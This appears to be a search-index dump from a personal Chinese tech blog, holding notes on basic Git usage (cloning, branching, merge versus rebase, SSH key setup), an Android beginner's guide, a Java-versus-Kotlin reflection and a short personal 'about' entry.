场景1：克隆仓库 # 克隆仓库到本地（可以使用HTTPS或者SSH协议） # \u0026#34;https://github.com/aaronlinv/learn-git.git\u0026#34; 为目标仓库地址 git clone https://github.com/aaronlinv/learn-git.git # Git会新建一个与仓库名同名的文件夹，进入文件夹 # \u0026#34;learn-git\u0026#34; 为项目名称 cd learn-git # 如果这个仓库已经克隆很久了，本地和远程可能存在差异了，可以拉取远程仓库最新状态到本地仓库 git pull 场景2：分支管理 # 已经克隆仓库到本地 # 开始工作前，先拉取远程最新修改（可能同事已经修改代码并提交了commit） git pull # 新建并跳转到dev分支（也可使用git branch -b dev） git switch -c dev # 查看分支情况 git branch # 可以在dev 分支上修改代码做add和commit # 推送dev分支到远程（需要拥有远端仓库的权限） git push origin dev # 如果需要重命名远端分支则加上 :f1 git push origin dev:f1 # 删除远端dev分支 git push origin :dev # 合并dev分支到master(需要先切换到master分支，在merge的过程可能需要解决冲突) git switch master git merge --no-ff dev # 查看分支合并情况 git log --graph --pretty=oneline --abbrev-commit # 删除本地dev分支 git branch -d dev merge 和 rebase 创建冲突场景 # 新建文件夹，初始化为Git仓库 mkdir learn-git cd learn-git git init # 添加并编辑文件 vim c2 # 添加文件到暂存区 git add c2 # 提交commit -m 代表添加一个“提交信息” git commit -m \u0026#34;c2\u0026#34; # 新建并跳转到experiment分支 git switch -c experiment # 添加并提交c4 vim c4 git add c4 git commit -m \u0026#34;c4\u0026#34; # 切换回master分支 git switch master # 添加并提交c3 vim c3 git add c3 git commit -m \u0026#34;c3\u0026#34; 到这c2就产生了分叉，experiment分支推进到了c4，master分支推进到了c3 这个时候如果想把两个分支的修改合并到master分支上，可以使用merge或rebase(变基)，两种方式最后合并的结果是一样的，但rebase不会产生分叉，rebase的提交历史也比merge更线性\nmerge # 使用merge方式合并分支 # 先切换到master分支 git switch master # 合并分支（会弹出commit message的编辑框，:wq 保存退出） git merge experiment # 查看分支合并情况 git log --graph --pretty=oneline --abbrev-commit \u0026mdash; merge示意图 引用自《Git Pro》\n使用merge合并分支，相当于三方合并，合并c2,c3,c4（未新建experiment分支前的修改c2、新建分支后master分支的修改c3、experiment分支的修改c4）\n直接使用git merge \u0026lt;要被merge的分支名\u0026gt; ，没有冲突的情况下默认使用参数：\u0026ndash;f 即：Fast-forward（快进式合并） 推荐使用\u0026ndash;no-ff 即：git merge \u0026ndash;no-ff \u0026lt;要被merge的分支名\u0026gt;\n这个参数的意思是禁止快进式合并，合并时会自动创建一次commit提交，保证提交链的完整性 而Fast-forward合并分支会丢掉分支信息\nrebase # 使用rebase方式合并分支 # 先切换到experiment分支 git switch experiment # rebase分支 git rebase master # 先切换到master分支 git switch master # 将experiment合并到master git merge experiment # 查看分支合并情况 git log --graph --pretty=oneline --abbrev-commit \u0026mdash; rebase示意图 引用自《Git Pro》\nrebase的原理是：找到c3和c4共同的祖先c2，暂存共同祖先c2到当前分支(expriment)的修改内容，然后将分支指向master的c3，并应用之前暂存的修改内容 我们可以这么理解：\nrebase就是先把其他分支(master)已经提交的代码（c3）放到前面，把当前分支(experiment)提交的修改(c4)放到后面，这样做的好处就是：自己写代码(experiment分支上的)将出现在master最新的一次commit中，一目了然\nrebase：黄金法则：绝对不要在公共分支使用rebase，rebase会重写提交历史\n参考资料 ssh-keygen的-C后面的邮箱有什么用？ Git 合并时 \u0026ndash;no-ff 的作用 记Git报错-refusing to merge unrelated histories\n","permalink":"https://aaronlinv.github.io/posts/git-%E7%AC%94%E8%AE%B0/","summary":"\u003ch2 id=\"学习建议\"\u003e学习建议\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://www.liaoxuefeng.com/wiki/896043488029600\"\u003e廖雪峰Git教程 \u003c/a\u003e比较详细，可操作性也比较强，在评论区可以找到勘误\nGit官方推荐的\u003ca href=\"https://git-scm.com/book/zh/v2\"\u003e《Pro Git》\u003c/a\u003e也很不错，推荐掌握了一定Git基础后再看\n对于没有 Linux 基础，或者文字版学起来比较困难的朋友可以看系列视频教程 \u003ca href=\"https://www.bilibili.com/video/BV1HW411f7VJ\"\u003e互联网人都该懂点 Git\u003c/a\u003e\nLinux 下最常用的编辑器就是 Vim，然而第一用可能会让你怀疑人生，建议先学习一下 ：\u003ca href=\"https://blog.csdn.net/qinfuan2017/article/details/79728906\"\u003e使用Vim创建和编辑文本文件\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"注意点\"\u003e注意点\u003c/h2\u003e\n\u003cp\u003eGit 2.23 (2019.8.16)\ngit checkout 这个命令被拆分成了两个新命令：git switch 和 git restore\n创建并切换到dev分支：git checkout -b dev 现在用git switch -c dev 效果相同\u003c/p\u003e\n\u003ch2 id=\"初始配置\"\u003e初始配置\u003c/h2\u003e\n\u003cp\u003e安装Git Bash后需要做初始配置\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e用户名邮箱\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 任意文件夹右键 点击“ Git Bash Here ”\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# \u0026#34;\u0026#34;内替换为自己的用户名和邮箱\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit config --global user.name \u003cspan class=\"s2\"\u003e\u0026#34;username\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit config --global user.email \u003cspan class=\"s2\"\u003e\u0026#34;email\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 查看配置是否成功\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit config user.name\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit config user.email\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003col start=\"2\"\u003e\n\u003cli\u003eSSH 免密登录\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ssh-keygen 用于生成，管理和转换身份验证密钥\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# -t：密钥的类型 \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# -C：用于识别这个密钥的注释（不添加注释直接ssh-keygen -t rsa也不影响使用）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003essh-keygen -t rsa -C \u003cspan class=\"s2\"\u003e\u0026#34;邮箱地址\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 连续按3次回车\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 将用户目录下.ssh文件夹内的id_rsa.pub的内容粘贴到GitHub的SSH Keys中\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 具体位置：GitHub Settings -\u0026gt; SSH and GPG keys -\u0026gt; SSH keys\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 测试是否成功 Github \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 码云测试命令为：ssh git@gitee.com 反馈的结果与 GitHub 类似\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003essh git@github.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Are you sure you want to continue connecting (yes/no)? \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 这时需要输入：yes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#成功会提示成功认证你的账户\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Hi aaronlinv! You\u0026#39;ve successfully authenticated, but GitHub does not provide shell access.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Connection to github.com closed.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"场景0git-基本使用\"\u003e场景0：Git 基本使用\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 新建文件夹，初始化为Git仓库\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir learn-git\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e learn-git\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit init\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 在当前目录添加并编辑文件(不熟悉 vim 编辑器可以用其他编辑器新建文件并编辑文件 )\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evim test.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 查看文件状态 test.txt现在为Untracked状态\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit status\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 添加文件到暂存区\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit add test.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 提交commit -m 代表添加一个“提交信息”\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit commit -m \u003cspan class=\"s2\"\u003e\u0026#34;add test.txt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 推送到 GitHub（在 GitHub 上创建空白仓库，并复制仓库地址）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# \u0026#34;git@github.com:aaronlinv/learn-git.git\u0026#34; 需要替换为自己新建的仓库地址\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 先添加远端仓库\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# origin：远端仓库的别名（默认origin）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit remote add origin git@github.com:aaronlinv/learn-git.git\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 查看远端操作（会显示 fetch和push）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit remote -v \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 推送到远端仓库（使用SSH协议需要配置SSH免密登录）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit push -u origin master\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# -u：指定默认远端仓库别名，下一次推送只需使用git push\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# origin：远端仓库的别名（默认origin）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# master：分支名称\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003epush 是可能会遇到报错：refusing to merge unrelated histories\n原因是远程仓库和本地仓库做了不同的改变并commit，导致本地仓库和远程仓库变成了独立的两个仓库，所以不能直接合并，执行以下命令合并代码，再push即可\u003c/p\u003e","title":"Git 笔记"},{"content":"在项目的第二阶段遇到挺多坑，所以整理了一下经验，如果你想尝试安卓开发，希望能帮到你。在此之前可以先看我之前写的 初见安卓开发，了解一下我们目前的情况\n预先准备 需要熟悉 Java 基础语法 安装开发环境（ JDK、AndroidStudio (简称 AS )、虚拟机等），安装环境比较繁琐，而且需要下载很多东西（默认都是安装到 C盘，总共可能会占用 20G 左右的空间）。安装可能会劝退一部分朋友，这里推荐两个教程跟着做就没问题了 安装AS之前一般会先安装 Java 开发工具包(JDK)，可以参考这篇博客【Android Studio安装部署系列】JDK开发环境搭建，比较值得一说的是，现在下载 JDK 要到 Oracle 官网，而且还需要注册账号，有点麻烦。然后开始安装 AS，参考这个视频教程 1# Android Studio开发环境 (Attect) Android开发教程\nAndroid Studio 设置代码提示和代码自动补全快捷键 Android Studio 真机测试/开发者模式 初学比较常用的快捷键：\n智能建议：Alt 回车 代码整理（格式化代码）： Ctrl Alt L 注释：Ctrl / 块注释：Ctrl Shift / 开始学习 如果没有任何开发经验，比较推荐看视频Android开发教程（ 2019最新版,使用 JetPack ），这个教程使用的是 JetPack库，前 40 集使用 Java，从 41 集开始换为了 Kotlin。个人觉得这作者讲的深入浅出，而且教程中也传递了很多规范化的思想，很适合初学者。要注意作者早期视频使用的是内测版本的 ViewModel库，而现在默认自带稳定版，所以不需要手动添加 ViewModel 依赖，视频中使用的 ViewModel 构造方法已过时，应该使用下面这个：\nMyViewModel = myViewModel = new ViewModelProvider(this).get(MyViewModel.class); 初学最好按着教程一步一步来，变量名也最好跟着教程来，这样出错了跟着视频，排错起来也比较容易。一定要跟着敲代码，边敲边理解整个逻辑，刚开始可能比较懵，但是到后面，对整个体系有了一定了解，就会豁然开朗，这个时候可以看看官方文档，这样会加深对安卓开发或是JetPack的理解\n觉得学的差不多了，就可以开始在GitHub上找一些感兴趣的安卓项目（或者是找一些最佳实践），克隆下来，看看别人是怎么写的，模仿这写一写，这个过程会遇到很多问题，解决这些问题，就会收获很大的提升\n遇到的问题 如果开始使用数据库或者网络相关操作就会遇到不能在主线程（UI线程）上运行这些耗时操作的问题，这个时候一般解决方案就是 new Thread，但是这样的话在 new 出来的线程里操作UI控件会报错： Only the original thread that created a view hierarchy can touch its views. 这个时候就需要学习一下 Android 多线程和异步任务，Kotlin的话可以用协程 2. 涉及网络请求推荐看这个系列，从 Java原生API 到 OkHttp 再到 Retrofit ：Android开发基础-网络编程 3. 如果界面比较复杂，使用系统自带的控件可能无法直接实现我们的需求，这个时候需要写一些自定义控件，推荐这个系列Android开发自定义控件基础课程 4. 页面跳转会使用到 Jetpack 中的Navigation组件：Jetpack 之 Navigation\n组件库 安卓有很多成熟的第三方组件库，合理使用可以简化开发，加速开发速度 在使用这些组件库时需要考虑安全性、稳定性等问题 推荐这个项目，可以帮助你找到适合的组件库 AndroidLibs\n","permalink":"https://aaronlinv.github.io/posts/%E5%AE%89%E5%8D%93%E5%88%9D%E5%AD%A6%E6%8C%87%E5%8D%97/","summary":"\u003cp\u003e在项目的第二阶段遇到挺多坑，所以整理了一下经验，如果你想尝试安卓开发，希望能帮到你。在此之前可以先看我之前写的 \u003ca href=\"https://www.cnblogs.com/aaronlinv/p/13596037.html\"\u003e初见安卓开发\u003c/a\u003e，了解一下我们目前的情况\u003c/p\u003e\n\u003ch3 id=\"预先准备\"\u003e预先准备\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e需要熟悉 Java 基础语法\u003c/li\u003e\n\u003cli\u003e安装开发环境（ JDK、AndroidStudio (简称 AS )、虚拟机等），安装环境比较繁琐，而且需要下载很多东西（默认都是安装到 C盘，总共可能会占用 20G 左右的空间）。安装可能会劝退一部分朋友，这里推荐两个教程跟着做就没问题了\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e安装AS之前一般会先安装 Java 开发工具包(JDK)，可以参考这篇博客\u003ca href=\"https://www.cnblogs.com/whycxb/p/9032559.html\"\u003e【Android Studio安装部署系列】JDK开发环境搭建\u003c/a\u003e，比较值得一说的是，现在下载 JDK 要到 Oracle 官网，而且还需要注册账号，有点麻烦。然后开始安装 AS，参考这个视频教程 \u003ca href=\"https://www.bilibili.com/video/BV18b411H7Fr\"\u003e1# Android Studio开发环境 (Attect) Android开发教程\u003c/a\u003e\u003c/p\u003e\n\u003col start=\"3\"\u003e\n\u003cli\u003e\u003ca href=\"https://blog.csdn.net/wyf2017/article/details/81355414\"\u003eAndroid Studio 设置代码提示和代码自动补全快捷键\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.cnblogs.com/zlc364624/p/10704980.html\"\u003eAndroid Studio 真机测试/开发者模式\u003c/a\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e初学比较常用的快捷键：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e智能建议：Alt 回车\u003c/li\u003e\n\u003cli\u003e代码整理（格式化代码）： Ctrl Alt L\u003c/li\u003e\n\u003cli\u003e注释：Ctrl /\u003c/li\u003e\n\u003cli\u003e块注释：Ctrl Shift /\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"开始学习\"\u003e开始学习\u003c/h3\u003e\n\u003cp\u003e如果没有任何开发经验，比较推荐看视频\u003ca href=\"https://www.bilibili.com/video/av50954019\"\u003eAndroid开发教程（ 2019最新版,使用 JetPack ）\u003c/a\u003e，这个教程使用的是 JetPack库，前 40 集使用 Java，从 41 集开始换为了 Kotlin。个人觉得这作者讲的深入浅出，而且教程中也传递了很多规范化的思想，很适合初学者。要注意作者早期视频使用的是内测版本的 ViewModel库，而现在默认自带稳定版，所以不需要手动添加 ViewModel 依赖，视频中使用的 ViewModel 构造方法已过时，应该使用下面这个：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-java\" data-lang=\"java\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eMyViewModel\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003emyViewModel\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eViewModelProvider\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"na\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eMyViewModel\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eclass\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e初学最好按着教程一步一步来，变量名也最好跟着教程来，这样出错了跟着视频，排错起来也比较容易。一定要跟着敲代码，边敲边理解整个逻辑，刚开始可能比较懵，但是到后面，对整个体系有了一定了解，就会豁然开朗，这个时候可以看看\u003ca href=\"https://developer.android.com/guide\"\u003e官方文档\u003c/a\u003e，这样会加深对安卓开发或是JetPack的理解\u003c/p\u003e\n\u003cp\u003e\u003c!-- raw HTML omitted --\u003e觉得学的差不多了，就可以开始在GitHub上找一些感兴趣的安卓项目（或者是找一些最佳实践），克隆下来，看看别人是怎么写的，模仿这写一写，这个过程会遇到很多问题，解决这些问题，就会收获很大的提升\u003c/p\u003e","title":"安卓初学指南"},{"content":"初见安卓开发 从 Android开发者官网 的导航栏我们可以看得出来 Google 在安卓开发方面主推 Jetpack 和 Kotlin\nAndroid Jetpack 是一套组件库，其中包含了很多组件，比如：LiveData、Room、ViewModel等等，使用这些组件极大简化了开发，消除样板代码，提高应用质量 Kotlin 是 JetBrains 在 2011 年发布的静态类型编程语言（这是一个开源项目），虽然语法上不能与 Java 兼容，但它是面向JVM，所以它可以和Java代码相互运作。在 Google I/O 2017 中，Google 宣布在 Android 上为 Kotlin 提供最佳支持，后来 Google 就把 Android 开发的官方语言更换为了 Kotlin\nJava or Kotlin 选择语言确实比较重要，会极大影响后续的开发工作。目前情况：团队成员有 Java 基础、无 Kotlin 基础、无安卓开发经验，项目有时间限制。这里列举几个我们团队比较可感知的影响因素进行对比\nJava 优点：Java安卓开发的资料相对多、遇到问题搜索到的概率比较大、Github 上有大量的 Java 安卓项目可以学习 缺点：相对 Kotlin 有很多样板代码、没有 Kotlin 的一些特性代码写起来会比较麻烦、Jetpack 库的资料大多用 Kotlin 举例\nKotlin 优点：有很多语法糖、简化 findViewById、简化数据类、空指针安全、函数式编程、协程（解决异步任务处理）\u0026hellip; 缺点：Kotlin 安卓相关的教程比较少，Kotlin 的资料相对没有 Java 那么多，遇到问题搜索到的概率相对低一点\n结合实际情况，我们最终选择了 Java，对于在这个时间节点，初学安卓使用 Java 没什么太大问题，以后转 Kotlin 也会比较容易，总的来说各有利弊，看取舍\n实际遇到的困难 虽然 JetPack 已经发布了比较长的时间（2018 年谷歌I/O 上发布），但是相关的资料并不很很好找（中文资料就更难找了），因为我们选择了 Java，在查 JetPack 资料的时候很容看到一些文章写的是 Kotlin，没有学过 Kotlin ，看起来一头雾水 因为技术更替速度很快，所以搜索一些问题的时候，会出现很多无效的解决方案。如果发布时间是 14、15、16 年或是使用 Eclipse 进行讲解的解决方案，要仔细辨别一下方案的时效性，那如果是讲解思路的话那就没有关系 安卓手机屏幕尺寸多样化，界面需要对不同屏幕进行适配 如果应用上架应用市场，需要考虑平台上架的规范，对于一些类型的应用需要资质才能上架，下面为酷安 2020.6.1 截取的上架规范 杂 这段时间都在学习安卓开发，和小组的其他伙伴协作完成项目 第一阶段结束收获颇丰，对于团队协作和 Git 都有了新的理解 纸上得来终觉浅，绝知此事要躬行，运用一门技术去解决问题才是学会一门技术的最佳途径\n在团队协作中，深刻地体会到了好的代码结构的重要性 通过这次的实践，更加清楚自己缺乏什么，也知道往哪个方向努力\n","permalink":"https://aaronlinv.github.io/posts/%E5%88%9D%E8%A7%81%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/","summary":"\u003ch2 id=\"初见安卓开发\"\u003e初见安卓开发\u003c/h2\u003e\n\u003cp\u003e\u003cimg alt=\"Android开发者官网 2020.6.1\" loading=\"lazy\" src=\"../%E5%88%9D%E8%A7%81%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/1929786-20200901142151492-852214615.png\"\u003e\u003c/p\u003e\n\u003cp\u003e从 \u003ca href=\"https://developer.android.google.cn/\"\u003eAndroid开发者官网\u003c/a\u003e 的导航栏我们可以看得出来 Google 在安卓开发方面主推 Jetpack 和 Kotlin\u003c/p\u003e\n\u003cp\u003e\u003c!-- raw HTML omitted --\u003e\u003ca href=\"https://developer.android.google.cn/jetpack/\"\u003eAndroid Jetpack\u003c/a\u003e 是一套组件库，其中包含了很多组件，比如：LiveData、Room、ViewModel等等，使用这些组件极大简化了开发，消除样板代码，提高应用质量\n\u003c!-- raw HTML omitted --\u003e\u003ca href=\"https://developer.android.google.cn/kotlin\"\u003eKotlin\u003c/a\u003e 是 JetBrains 在 2011 年发布的静态类型编程语言（这是一个开源项目），虽然语法上不能与 Java 兼容，但它是面向JVM，所以它可以和Java代码相互运作。在 Google I/O 2017 中，Google 宣布在 Android 上为 Kotlin 提供最佳支持，后来 Google 就把 Android 开发的官方语言更换为了 Kotlin\u003c/p\u003e\n\u003ch2 id=\"java-or-kotlin\"\u003eJava or Kotlin\u003c/h2\u003e\n\u003cp\u003e选择语言确实比较重要，会极大影响后续的开发工作。目前情况：团队成员有 Java 基础、无 Kotlin 基础、无安卓开发经验，项目有时间限制。这里列举几个我们团队比较可感知的影响因素进行对比\u003c/p\u003e\n\u003ch4 id=\"java\"\u003eJava\u003c/h4\u003e\n\u003cp\u003e优点：Java安卓开发的资料相对多、遇到问题搜索到的概率比较大、Github 上有大量的 Java 安卓项目可以学习\n缺点：相对 Kotlin 有很多样板代码、没有 Kotlin 的一些特性代码写起来会比较麻烦、Jetpack 库的资料大多用 Kotlin 举例\u003c/p\u003e\n\u003ch4 id=\"kotlin\"\u003eKotlin\u003c/h4\u003e\n\u003cp\u003e优点：有很多语法糖、简化 findViewById、简化数据类、空指针安全、函数式编程、协程（解决异步任务处理）\u0026hellip;\n缺点：Kotlin 安卓相关的教程比较少，Kotlin 的资料相对没有 Java 那么多，遇到问题搜索到的概率相对低一点\u003c/p\u003e","title":"初见安卓开发"},{"content":"自留地 看着越来越多消失的博客，2025 年初重新开始倒腾 Pages\n越来越逼仄的空间，退无可退，不如坦然面对\n极简主义 践行极简主义，删繁就简，做少少的事，爱具体的人\n简单让我自由，不重要的东西就应该被忘记\n快命令 